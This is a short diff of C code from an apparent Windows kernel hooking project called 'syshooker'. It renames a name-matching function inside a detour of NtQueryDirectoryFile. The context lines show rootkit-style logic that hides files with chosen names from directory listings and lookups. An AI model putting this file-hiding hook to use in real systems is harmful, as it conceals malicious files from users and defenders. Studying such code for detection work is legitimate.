@@ -46,7 +46,7 @@ NTSTATUS DetourNtQueryDirectoryFile(
 			for (size_t i = 0; i < FileName->Length && i < SYSHOOKER_MAX_NAME_LENGTH - 1; i++) {
 				TempBuffer[i] = FileName->Buffer[i];
 			}
-			if (matchMagicNames(TempBuffer, (Target)TARGET_FILE)) { // FileName is optionally used, for example, in tab-complete
+			if (matchSyshookerNames(TempBuffer, (Target)TARGET_FILE)) { // FileName is optionally used, for example, in tab-complete
 				return STATUS_NO_SUCH_FILE;
 			}
 		}
@@ -64,7 +64,7 @@ NTSTATUS DetourNtQueryDirectoryFile(
 				}
 				//kprintf("[+] syshooker: NtQueryDirectoryFile: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
 				//if (wcsstr(FileNameBuffer, Settings.NtQueryDirectoryFileExMagicName)) {
-				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
+				if (matchSyshookerNames(FileNameBuffer, (Target)TARGET_FILE)) {
 					kprintf("[+] syshooker: NtQueryDirectoryFile: SHOULD HIDE: %ws\n", FileNameBuffer);
 
 					// Not the last one
